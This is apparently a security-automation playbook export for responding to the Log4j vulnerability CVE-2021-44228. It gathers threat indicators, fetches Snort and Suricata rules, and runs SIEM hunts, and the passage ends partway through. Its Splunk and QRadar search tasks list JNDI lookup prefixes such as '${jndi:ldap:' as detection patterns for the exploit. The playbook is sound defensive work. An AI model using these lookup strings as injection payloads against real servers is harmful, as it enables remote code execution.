contentitemexportablefields:
  contentitemfields:
    definitionid: ""
    fromServerVersion: 6.0.0
    itemVersion: 1.0.6
    packID: ""
    packName: ""
    prevname: ""
    propagationLabels:
    - all
    toServerVersion: ""
description: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,
  a remote code execution (RCE) vulnerability in Apache log4j 2 was identified being
  exploited in the wild. Public proof of concept (PoC) code was released and subsequent
  investigation revealed that exploitation was incredibly easy to perform. \n\nOn
  Dec. 14 2021, another vulnerability was discovered related the log4j 0-day exploit
  known as CVE-2021-45046.\n\nOn Dec 18 2021, yet another vulnerability was discovered
  related the log4j 0-day exploit known as CVE-2021-45105 that allows an attacker
  with control over Thread Context Map data to cause a denial of service when a crafted
  string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.\n\n**Affected
  Version**\n\nApache Log4j 2.x <= 2.15.0-rc1\n\nThis playbook should be triggered
  manually or can be configured as a job.\nPlease create a new incident and choose
  the **CVE-2021-44228 - Log4j RCE** playbook and **Rapid Breach Response** incident
  type.\n\n**The playbook includes the following tasks:**\n\n* Collect related known
  indicators from several sources.\n* Indicators and exploitation patterns hunting
  using PAN-OS, Cortex XDR and SIEM products.\n*Search for possible vulnerable servers
  using Xpanse.\n* Block indicators automatically or manually.\n\n**Mitigations:**\n*
  Apache official CVE-2021-44228 patch.\n* Unit42 recommended mitigations.\n* Detection
  Rules.\n    * Snort\n    * Suricata\n    * Sigma\n    * Yara\n\nMore information:\n[Apache
  Log4j Vulnerability Is Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\nNote:
  This is a beta playbook, which lets you implement and test pre-release software.
  Since the playbook is beta, it might contain bugs. Updates to the pack during the
  beta phase might include non-backward compatible features. We appreciate your feedback
  on the quality and usability of the pack to help us identify issues, fix them, and
  continually improve."
id: 5c4ee6c1-4aba-4f7f-81a8-7297ba2fc142
inputs:
- description: |-
    The Splunk index field to search in.
    Default is "*"
  key: SplunkIndex
  playbookInputQuery: null
  required: false
  value:
    simple: '*'
- description: |-
    The Splunk sourcetype field to search in.
    Default is "*"
  key: SplunkSourcetype
  playbookInputQuery: null
  required: false
  value:
    simple: '*'
- description: The earliest time for Splunk query.
  key: SplunkEarliestTime
  playbookInputQuery: null
  required: false
  value:
    simple: -1d@d
- description: The time range for QRadar query.
  key: QRadarTimeRange
  playbookInputQuery: null
  required: false
  value:
    simple: Last 1 DAYS
- description: Whether to investigate automatically the endpoint logs "/var/log" using
    XDR Endpoint Script Execution or manually.
  key: XDRScriptExecution
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: The Endpoint IDs to search using XDR Endpoint Script Execution in a
    comma delimited format. If you would like the playbook to execute the command
    on all known Linux OS endpoints Set to "ALL".
  key: XDREndpointIDs
  playbookInputQuery: null
  required: false
  value: {}
- description: The playbook description for Rapid Breach Response layout.
  key: PlaybookDescription
  playbookInputQuery: null
  required: false
  value:
    simple: "Critical RCE Vulnerability: log4j - CVE-2021-44228\n\nOn Dec. 9, 2021,
      a remote code execution (RCE) vulnerability in Apache log4j 2 was identified
      being exploited in the wild. Public proof of concept (PoC) code was released
      and subsequent investigation revealed that exploitation was incredibly easy
      to perform. \n\nAffected Version\nApache Log4j 2.x <= 2.15.0-rc1\n\nThis playbook
      should be trigger manually and includes the following tasks: \n\n* Collect related
      known indicators from several sources.\n* Indicators and exploitation patterns
      hunting using PAN-OS, Cortex XDR and SIEM products.\n* Block indicators automatically
      or manually.\n\nMitigations:\n* Apache official CVE-2021-44228 patch.\n* Unit42
      recommended mitigations.\n\nMore information:\n[Apache Log4j Vulnerability Is
      Actively Exploited in the Wild (CVE-2021-44228)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)\n\nNote:
      This is a beta playbook, which lets you implement and test pre-release software.
      Since the playbook is beta, it might contain bugs. Updates to the pack during
      the beta phase might include non-backward compatible features. We appreciate
      your feedback on the quality and usability of the pack to help us identify issues,
      fix them, and continually improve."
- description: The EDL domain blocklist name.
  key: EDLDomainBlocklist
  playbookInputQuery: null
  required: false
  value: {}
- description: Whether to block the indicators automatically or not.
  key: BlockIndicatorsAutomatically
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: "The verdict of the collected indicators. Default is \"Malicious\".
    \nOther options can be \"Suspicious\" and \"Unknown\"."
  key: CollectedIndicatorsSeverity
  playbookInputQuery: null
  required: false
  value:
    simple: Malicious
- description: Whether to perform XQL hunting queries. Default is "False".
  key: RunXQLHuntingQueries
  playbookInputQuery: null
  required: false
  value:
    simple: "False"
- description: The log4j related CVEs.
  key: RelatedCVEs
  playbookInputQuery: null
  required: false
  value:
    simple: CVE-2021-44228, CVE-2021-45046, CVE-2021-45105
name: TCS-CVE-2021-44228 - Log4j RCE_KK
outputs: []
sourceplaybookid: CVE-2021-44228 - Log4j RCE
starttaskid: "0"
tasks:
  "0":
    continueonerrortype: ""
    id: "0"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "1"
      - "66"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 3abbef55-13bf-4a38-8f3e-f41692454258
      iscommand: false
      name: ""
      version: -1
    taskid: 3abbef55-13bf-4a38-8f3e-f41692454258
    timertriggers: []
    type: start
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -1290
        }
      }
  "1":
    continueonerrortype: ""
    id: "1"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "2"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 8fea0d59-8451-4f94-8d82-cdda93ce2442
      iscommand: false
      name: Collect Indicators
      type: title
      version: -1
    taskid: 8fea0d59-8451-4f94-8d82-cdda93ce2442
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -1130
        }
      }
  "2":
    continueonerror: true
    continueonerrortype: ""
    id: "2"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      unescape_domain:
        simple: "False"
      url:
        simple: https://gist.githubusercontent.com/gnremy/c546c7911d5f876f263309d7161a7217/raw/170f7d6cf92172443ecc68db0b6cbd4d8226a398/CVE-2021-44228_IPs.csv
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: This script will extract indicators from HTML and will handle bad
        TLD to avoid file extensions false positives.
      id: cd08b169-e52e-4fb4-8caf-3b5869ffc2b7
      iscommand: false
      name: Collect indicators from GreyNoise
      script: ParseHTMLIndicators
      type: regular
      version: -1
    taskid: cd08b169-e52e-4fb4-8caf-3b5869ffc2b7
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2150,
          "y": -980
        }
      }
  "6":
    continueonerrortype: ""
    id: "6"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: emerging-exploit-suricata.rules
      method:
        simple: GET
      proxy:
        simple: "true"
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/suricata-5.0/rules/emerging-exploit.rules
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: |-
        Download Suricata Rules.
        Please note the log4j rules are part of the released package.
      id: df52736b-d20c-4afe-8460-12702cc874b6
      iscommand: false
      name: Download Suricata Rules
      script: http
      type: regular
      version: -1
    taskid: df52736b-d20c-4afe-8460-12702cc874b6
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -980
        }
      }
  "7":
    continueonerrortype: ""
    id: "7"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: emerging-exploit-snort.rules
      method:
        simple: GET
      proxy:
        simple: "true"
      saveAsFile:
        simple: "yes"
      url:
        simple: https://rules.emergingthreatspro.com/open/snort-2.9.0/rules/emerging-exploit.rules
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: |-
        Download Snort Rules.
        Please note the log4j rules are part of the released package.
      id: b66a1e5e-0da5-4606-8d58-b045e62cc928
      iscommand: false
      name: Download Snort Rules
      script: http
      type: regular
      version: -1
    taskid: b66a1e5e-0da5-4606-8d58-b045e62cc928
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1690,
          "y": -980
        }
      }
  "8":
    continueonerrortype: ""
    id: "8"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "9"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 8f7e3472-c6a4-40ad-8f31-ee9fe29c89fb
      iscommand: false
      name: Extract Indicators
      type: title
      version: -1
    taskid: 8f7e3472-c6a4-40ad-8f31-ee9fe29c89fb
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -800
        }
      }
  "9":
    continueonerror: true
    continueonerrortype: ""
    id: "9"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "10"
    note: false
    quietmode: 0
    scriptarguments:
      text:
        complex:
          accessor: indicators
          root: http.parsedBlog
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.extract.indicators
      id: c5e0bc80-c9f1-4c60-8705-5361afa178ec
      iscommand: true
      name: Extract Indicators From Data Collected
      script: Builtin|||extractIndicators
      type: regular
      version: -1
    taskid: c5e0bc80-c9f1-4c60-8705-5361afa178ec
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -640
        }
      }
  "10":
    continueonerrortype: ""
    id: "10"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "57"
      - "58"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 3a84066d-ad80-4276-850a-126a5eb64349
      iscommand: false
      name: Tag and Link Indicators
      type: title
      version: -1
    taskid: 3a84066d-ad80-4276-850a-126a5eb64349
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -440
        }
      }
  "15":
    continueonerrortype: ""
    id: "15"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "36"
    note: false
    quietmode: 0
    scriptarguments:
      incidentId:
        complex:
          accessor: id
          root: incident
      indicatorsValues:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
              operator: isNotEmpty
          root: ExtractedIndicators.IP
          transformers:
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.Domain
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.URL
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.CVE
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
            operator: append
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.associate.indicators
      id: 6c2c8730-c750-4582-8803-3cf0bc14cb4d
      iscommand: true
      name: Link Indicators To Incident
      script: Builtin|||associateIndicatorsToIncident
      type: regular
      version: -1
    taskid: 6c2c8730-c750-4582-8803-3cf0bc14cb4d
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1230,
          "y": -80
        }
      }
  "16":
    continueonerrortype: ""
    id: "16"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "19"
      - "20"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 43a6f3b5-882e-4922-8b6a-1ac72ea5dc9c
      iscommand: false
      name: SIEM Hunting
      type: title
      version: -1
    taskid: 43a6f3b5-882e-4922-8b6a-1ac72ea5dc9c
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 760,
          "y": 560
        }
      }
  "17":
    continueonerrortype: ""
    id: "17"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "27"
      - "28"
      - "88"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 5ad7ec08-2cb1-4909-8b51-866bbe96311e
      iscommand: false
      name: Palo Alto Networks Hunting
      type: title
      version: -1
    taskid: 5ad7ec08-2cb1-4909-8b51-866bbe96311e
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1700,
          "y": 560
        }
      }
  "19":
    continueonerrortype: ""
    id: "19"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        IPAddress:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        IndexName:
          simple: index=*
        MD5:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SHA1:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "40"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SHA256:
          complex:
            accessor: File
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        SelectFields:
          simple: source,timestamp
        URLDomain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        earliest_time:
          complex:
            root: inputs.SplunkEarliestTime
        event_limit:
          simple: "100"
        latest_time:
          complex:
            root: inputs.SplunkLatestTime
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddress:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      IndexName:
        simple: index=*
      SelectFields:
        simple: source,timestamp
      URLDomain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      event_limit:
        simple: "100"
      latest_time:
        complex:
          root: inputs.SplunkLatestTime
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook queries Splunk for indicators such as file hashes,
        IP addresses, domains, or urls. It outputs detected users, ip addresses, and
        hostnames related to the indicators.
      id: de9cd8e0-fef6-4290-8931-7435e83d19cc
      iscommand: false
      name: Splunk Indicator Hunting
      playbookId: Splunk Indicator Hunting
      type: playbook
      version: -1
    taskid: de9cd8e0-fef6-4290-8931-7435e83d19cc
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 970,
          "y": 720
        }
      }
  "20":
    continueonerrortype: ""
    id: "20"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        IPAddress:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        InvestigationIPFields:
          simple: sourceip,destinationip
        InvestigationUserFields:
          simple: username
        MD5:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        QradarIPfield:
          simple: sourceip,destinationip
        SHA1:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "40"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        SHA256:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        TimeFrame:
          complex:
            root: inputs.QRadarTimeRange
        URLDomain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - operator: uniq
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddress:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      InvestigationIPFields:
        simple: sourceip,destinationip
      InvestigationUserFields:
        simple: username
      QradarIPfield:
        simple: sourceip,destinationip
      TimeFrame:
        complex:
          root: inputs.QRadarTimeRange
      URLDomain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - operator: uniq
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: 'The Playbook queries QRadar SIEM for indicators such as file hashes,
        IP addresses, domains, or urls. '
      id: d778b117-827b-476d-848f-c6649bbcd526
      iscommand: false
      name: QRadar Indicator Hunting V2
      playbookId: QRadar Indicator Hunting V2
      type: playbook
      version: -1
    taskid: d778b117-827b-476d-848f-c6649bbcd526
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 550,
          "y": 720
        }
      }
  "21":
    continueonerrortype: ""
    id: "21"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "22"
      - "24"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 5ec940dd-d641-444f-84af-691d4d86122a
      iscommand: false
      name: SIEM Advanced Hunting
      type: title
      version: -1
    taskid: 5ec940dd-d641-444f-84af-691d4d86122a
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": -280,
          "y": 560
        }
      }
  "22":
    conditions:
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                filters:
                - - left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: isEqualString
                    right:
                      value:
                        simple: SplunkPy
                - - left:
                      iscontext: true
                      value:
                        simple: modules.state
                    operator: isEqualString
                    right:
                      value:
                        simple: active
                root: modules
          operator: isExists
      label: "Yes"
    continueonerrortype: ""
    id: "22"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "26"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check if Splunk instance is enabled.
      id: 57be3d8c-6227-442f-8b22-d5a07b7fcfda
      iscommand: false
      name: Is Splunk Enabled?
      type: condition
      version: -1
    taskid: 57be3d8c-6227-442f-8b22-d5a07b7fcfda
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": -10,
          "y": 720
        }
      }
  "23":
    continueonerrortype: ""
    id: "23"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "17"
      - "21"
      - "16"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: f0d3a2d2-6656-4858-8db1-1edf5f4d004d
      iscommand: false
      name: Threat Hunting
      type: title
      version: -1
    taskid: f0d3a2d2-6656-4858-8db1-1edf5f4d004d
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 410
        }
      }
  "24":
    conditions:
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                filters:
                - - left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: isEqualString
                    right:
                      value:
                        simple: QRadar_v2
                - - left:
                      iscontext: true
                      value:
                        simple: modules.state
                    operator: isEqualString
                    right:
                      value:
                        simple: active
                root: modules
          operator: isExists
      label: "Yes"
    continueonerrortype: ""
    id: "24"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "Yes":
      - "25"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check if Splunk instance is enabled.
      id: e650a70d-ab28-45c5-8f9b-6ec01df6e615
      iscommand: false
      name: Is QRadar Enabled?
      type: condition
      version: -1
    taskid: e650a70d-ab28-45c5-8f9b-6ec01df6e615
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": -550,
          "y": 720
        }
      }
  "25":
    continueonerror: true
    continueonerrortype: ""
    id: "25"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "60"
    note: false
    quietmode: 0
    scriptarguments:
      base_field_match:
        simple: partial
      base_field_state:
        simple: include
      base_fields_to_search:
        simple: user_agent
      base_values_to_search:
        simple: '"${jndi:ldap:","${jndi:rmi:","${jndi:ldaps:","${jndi:dns:","{jndi:corba:","{jndi:iiop:","{jndi:nis:","{jndi:nds:"'
      select_fields:
        simple: DATEFORMAT(devicetime,'dd-MM-yyyy hh:mm'),LOGSOURCENAME(logsourceid),CATEGORYNAME(category),QIDNAME(qid),sourceip,destinationip,username')
      time_frame:
        complex:
          root: inputs.QRadarTimeRange
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Build QRadar AQL Query.
      id: 6f73f572-6c42-4ed6-8d9f-da224b18a4ab
      iscommand: false
      name: Build QRadar AQL Query
      script: QRadarCreateAQLQuery
      type: regular
      version: -1
    taskid: 6f73f572-6c42-4ed6-8d9f-da224b18a4ab
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -550,
          "y": 910
        }
      }
  "26":
    continueonerrortype: ""
    id: "26"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      earliest_time:
        complex:
          root: inputs.SplunkEarliestTime
      query:
        simple: index=${SplunkIndex} sourcetype=${SplunkSourcetype} "${jndi:ldap:"
          OR "${jndi:rmi:" OR "${jndi:ldaps:" OR "${jndi:dns:" OR "{jndi:corba:" OR
          "{jndi:iiop:" OR "{jndi:nis:" OR "{jndi:nds:"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Searches Splunk for suspicious file creation where the file path
        is under INETCACHE.
      id: 0f636b27-ab45-4df6-89af-14e9bcc59332
      iscommand: true
      name: Search for exploitation patterns
      script: '|||splunk-search'
      type: regular
      version: -1
    taskid: 0f636b27-ab45-4df6-89af-14e9bcc59332
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -10,
          "y": 910
        }
      }
  "27":
    continueonerrortype: ""
    id: "27"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      IPAddresses:
        complex:
          accessor: IP
          root: ExtractedIndicators
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: "This is a multipurpose playbook used for hunting and threat detection.
        The playbook receives inputs based on hashes, IP addresses, or domain names
        provided manually or from outputs by other playbooks. \nWith the received
        indicators, the playbook leverages data received by PANW products including,
        Cortex Data Lake, Autofocus and Pan-OS to search for IP addresses, host names
        and users related to the provided indicators.\nThe output provided by the
        playbook facilitates pivoting searches for possibly affected IP addresses
        or users."
      id: 91e4082d-33d5-47bb-8f0f-a0bce3e52724
      iscommand: false
      name: Palo Alto Networks - Hunting And Threat Detection
      playbookId: Palo Alto Networks - Hunting And Threat Detection
      type: playbook
      version: -1
    taskid: 91e4082d-33d5-47bb-8f0f-a0bce3e52724
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1490,
          "y": 720
        }
      }
  "28":
    continueonerrortype: ""
    id: "28"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      log_type:
        simple: threat
      query:
        simple: (threatid eq 91991) or (threatid eq 91994) or (threatid eq 91995)
          or (threatid eq 92001) or (threatid eq 92012)
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: 'Query Panorama Logs of types: traffic, threat, url, data-filtering
        and wildfire.'
      id: ec44c97f-88be-4d34-81fc-5aeaf48b8a34
      iscommand: false
      name: Panorama Query Logs for Related Session
      playbookId: Panorama Query Logs
      type: playbook
      version: -1
    taskid: ec44c97f-88be-4d34-81fc-5aeaf48b8a34
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1910,
          "y": 720
        }
      }
  "29":
    continueonerrortype: ""
    id: "29"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "39"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 1a4c9add-4218-45ce-89e5-c621aa182e20
      iscommand: false
      name: 'Remediation '
      type: title
      version: -1
    taskid: 1a4c9add-4218-45ce-89e5-c621aa182e20
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2615
        }
      }
  "32":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDRScriptExecution
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "32"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      "yes":
      - "33"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether to execute XDR shell script for exploitation hunting.
      id: e1fe186d-aac0-4c53-8001-3ef35e216e06
      iscommand: false
      name: Should search using XDR Endpoint Script Execution?
      type: condition
      version: -1
    taskid: e1fe186d-aac0-4c53-8001-3ef35e216e06
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1690,
          "y": 1900
        }
      }
  "33":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isEqualString
          right:
            value:
              simple: ALL
      label: ALL
    - condition:
      - - left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isNotEmpty
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.XDREndpointIDs
          operator: isNotEqualString
          right:
            value:
              simple: ALL
      label: Specific
    continueonerrortype: ""
    id: "33"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      ALL:
      - "70"
      Specific:
      - "72"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether the necessary input 'XDREndpointIDs' was provided.
      id: c6a330cd-cfc8-49f8-8f1c-1c3a4cd7e62f
      iscommand: false
      name: Should run on all known Linux OS endpoints?
      type: condition
      version: -1
    taskid: c6a330cd-cfc8-49f8-8f1c-1c3a4cd7e62f
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1870,
          "y": 2070
        }
      }
  "35":
    continueonerrortype: ""
    id: "35"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        SourceOfIndicators:
          complex:
            accessor: sourceLink
            root: http.parsedBlog
        countTotalIndicators:
          complex:
            accessor: Domain
            root: ExtractedIndicators
            transformers:
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.IP
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.URL
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
              operator: append
            - args:
                item:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.CVE
              operator: append
            - operator: uniq
            - operator: count
        playbookDescription:
          complex:
            root: inputs.Description
      wait: 1
    nexttasks:
      '#none#':
      - "23"
    note: false
    quietmode: 0
    scriptarguments:
      SourceOfIndicators:
        complex:
          accessor: sourceLink
          root: http.parsedBlog
      countTotalIndicators:
        complex:
          accessor: Domain
          root: ExtractedIndicators
          transformers:
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.URL
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
            operator: append
          - args:
              item:
                iscontext: true
                value:
                  simple: ExtractedIndicators.CVE
            operator: append
          - operator: uniq
          - operator: count
      playbookDescription:
        complex:
          root: inputs.PlaybookDescription
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook is responsible for setting up the Rapid Breach Response
        Incident Info tab.
      id: 69187a7a-6ab8-41c9-8738-5535ddb1fac8
      iscommand: false
      name: Rapid Breach Response - Set Incident Info
      playbookId: Rapid Breach Response - Set Incident Info
      type: playbook
      version: -1
    taskid: 69187a7a-6ab8-41c9-8738-5535ddb1fac8
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1230,
          "y": 240
        }
      }
  "36":
    continueonerrortype: ""
    id: "36"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "35"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: d4c654f2-25c4-472b-8005-4ae1d3292557
      iscommand: false
      name: Handle Rapid Breach Response Layout
      type: title
      version: -1
    taskid: d4c654f2-25c4-472b-8005-4ae1d3292557
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
